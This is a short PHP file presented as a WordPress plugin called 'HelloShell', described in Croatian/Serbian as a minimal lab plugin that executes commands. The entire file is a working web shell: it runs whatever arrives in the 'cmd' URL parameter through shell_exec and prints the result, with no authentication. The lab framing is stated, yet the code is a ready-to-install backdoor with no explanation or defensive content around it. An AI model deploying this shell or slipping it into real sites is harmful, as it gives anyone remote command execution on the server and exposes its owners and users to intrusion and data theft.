<?php
/** 
 * Plugin Name: HelloShell
 * Description: Minimal plugin za lab koji izvršava komande.
 */

if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
